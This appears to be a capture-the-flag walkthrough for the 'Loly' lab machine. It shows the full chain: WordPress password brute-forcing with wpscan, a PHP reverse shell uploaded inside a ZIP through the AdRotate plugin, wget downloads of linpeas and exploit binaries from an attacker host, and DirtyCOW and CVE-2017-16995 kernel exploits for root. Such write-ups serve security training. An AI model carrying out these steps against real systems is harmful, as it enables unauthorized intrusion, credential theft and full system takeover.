# Loly

## Initial access

Run `autorecon` to enumerate open ports and services:

```
sudo autorecon 192.168.249.121
```

Open ports discovered:

- **80** — HTTP (nginx 1.10.3 (Ubuntu))
  - `http://192.168.249.121/wordpress/`

Browse to `http://192.168.249.121/` — a default `Welcome to nginx!` page is displayed.

Browse to `http://192.168.249.121/wordpress/` — a WordPress site containing links to `http://loly.lc/wordpress/`. Add `loly.lc` to `/etc/hosts`:

```
192.168.249.121 loly.lc
```

Enumerate WordPress users with `wpscan`:

```
wpscan --url http://loly.lc/wordpress/ -e u -P /usr/share/wordlists/rockyou.txt -t 100
...
[+] Enumerating Users (via Passive and Aggressive Methods)

[+] loly
 | Found By: Author Posts - Display Name (Passive Detection)
[+] A WordPress Commenter
 | Found By: Rss Generator (Passive Detection)
[i] 2 user(s) Identified.

[+] Performing password attack on Xmlrpc against 2 user/s
[SUCCESS] - loly / fernando
```

Credentials: `loly:fernando`

Enumerate WordPress plugins with `wpscan`:

```
wpscan --url http://loly.lc/wordpress/ -e ap --plugins-detection aggressive --force -t 100
...
[+] adrotate
 | Location: http://loly.lc/wordpress/wp-content/plugins/adrotate/
 | Last Updated: 2026-10-10 11:01pm GMT (23 days ago, per WordPress.org)
 | Active Installs: 20,000 (per WordPress.org)
 | Readme: http://loly.lc/wordpress/wp-content/plugins/adrotate/readme.txt
 | [!] The version is out of date, the latest version is 5.19.3
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://loly.lc/wordpress/wp-content/plugins/adrotate/, status: 200
 |
 | Version: 5.8.6.2 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://loly.lc/wordpress/wp-content/plugins/adrotate/readme.txt
```

Login as `loly` at `http://loly.lc/wordpress/wp-login.php` using `loly:fernando`.

Explore the AdRotate plugin dashboard at `http://loly.lc/wordpress/wp-admin/admin.php?page=adrotate`. The plugin includes a file upload page at `http://loly.lc/wordpress/wp-admin/admin.php?page=adrotate-media` that accepts `jpg`, `jpeg`, `gif`, `png`, `svg`, `html`, `js`, and `zip` files (max 512KB per file). Zip files are automatically extracted in the upload location.

Uploading a `.php` reverse shell directly is rejected with an `Unexpected error` message. However, compressing a PHP reverse shell into a ZIP archive succeeds — the file is extracted to the banners directory.

Browse to `http://loly.lc/wordpress/wp-content/banners/reverse_shell.php` to trigger the reverse shell, caught with `penelope`:

```
www-data@lab-pg-ubuntu16-loly-245-199:/$ whoami
www-data
```

Retrieve the `local.txt` flag:

```
www-data@lab-pg-ubuntu16-loly-245-199:/$ find / -name local.txt 2>/dev/null
/var/www/local.txt

www-data@lab-pg-ubuntu16-loly-245-199:/$ cat /var/www/local.txt
bf5067168a91890749106df8cd9ca834
```

## Privilege escalation

Upload `linpeas.sh` to the target. On the attacking machine, start a Python HTTP server:

```
# Host
python3 -m http.server 9001

ip a
inet 192.168.45.189

# Target
www-data@lab-pg-ubuntu16-loly-245-199:/$ cd /tmp
www-data@lab-pg-ubuntu16-loly-245-199:/tmp$ which wget
/usr/bin/wget

www-data@lab-pg-ubuntu16-loly-245-199:/tmp$ wget http://192.168.45.189:9001/linpeas.sh
```

Run `linpeas.sh` to enumerate privilege escalation vectors:

```
www-data@lab-pg-ubuntu16-loly-245-199:/tmp$ chmod +x linpeas.sh
www-data@lab-pg-ubuntu16-loly-245-199:/tmp$ ./linpeas.sh
```

Important findings:

```
╔══════════╣ Kernel Exploit Registry (T1068)
...
CVE: CVE-2016-5195 | Name: dirtycow | Match data: pkg=linux-kernel,ver>=2.6.22,ver<=4.8.3 | Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},ubuntu=16.04|14.04|12.04 | Rank: 4 | Details: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
```

Download the DirtyCOW exploit and run it on the target:

```
www-data@lab-pg-ubuntu16-loly-245-199:/tmp$ uname -m
x86_64

www-data@lab-pg-ubuntu16-loly-245-199:/tmp$ wget http://192.168.45.189:9001/DirtyCOW_64
www-data@lab-pg-ubuntu16-loly-245-199:/tmp$ chmod +x DirtyCOW_64

www-data@lab-pg-ubuntu16-loly-245-199:/tmp$ ./DirtyCOW_64
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: root
```

Gain a privileged shell:

```
www-data@lab-pg-ubuntu16-loly-245-199:/tmp$ su
Password: root

firefart@lab-pg-ubuntu16-loly-245-199:~# whoami
firefart
firefart@lab-pg-ubuntu16-loly-245-199:~# id
uid=0(firefart) gid=0(root) groups=0(root)
```

Retrieve the `proof.txt` flag:

```
firefart@lab-pg-ubuntu16-loly-245-199:/tmp# cd /root
firefart@lab-pg-ubuntu16-loly-245-199:~# cat proof.txt
7ac382728c75118eaaf75d0ad1d3b940
```

### Alternative Privilege Escalation — wp-config.php credentials + BPF sign extension (CVE-2017-16995)

The file `/var/www/html/wordpress/wp-config.php` contains MySQL database credentials. The `DB_PASSWORD` value (`lolyisabeautifulgirl`) is also the password for the `loly` system user, providing a non-`www-data` shell before privilege escalation:

```
www-data@lab-pg-ubuntu16-loly-245-199:/var/www/html/wordpress$ cat wp-config.php
...
define( 'DB_USER', 'wordpress' );
define( 'DB_PASSWORD', 'lolyisabeautifulgirl' );
...

www-data@lab-pg-ubuntu16-loly-245-199:/var/www/html/wordpress$ su loly
Password: lolyisabeautifulgirl

loly@lab-pg-ubuntu16-loly-245-199:~$ id
uid=1000(loly) gid=1000(loly) groups=1000(loly)
```

The kernel version `4.4.0-31-generic` is vulnerable to the BPF sign extension privilege escalation (CVE-2017-16995). Download and compile the exploit from Exploit-DB (EDB 45010):

```
loly@lab-pg-ubuntu16-loly-245-199:~$ wget http://192.168.45.189:9001/45010.c
loly@lab-pg-ubuntu16-loly-245-199:~$ gcc 45010.c -o cve-2017-16995
loly@lab-pg-ubuntu16-loly-245-199:~$ ./cve-2017-16995
```

The exploit grants root access:

```
# whoami
root
```

Credit: [dsec — Loly (PG play)](https://dsec.blog/loly-pg-play)
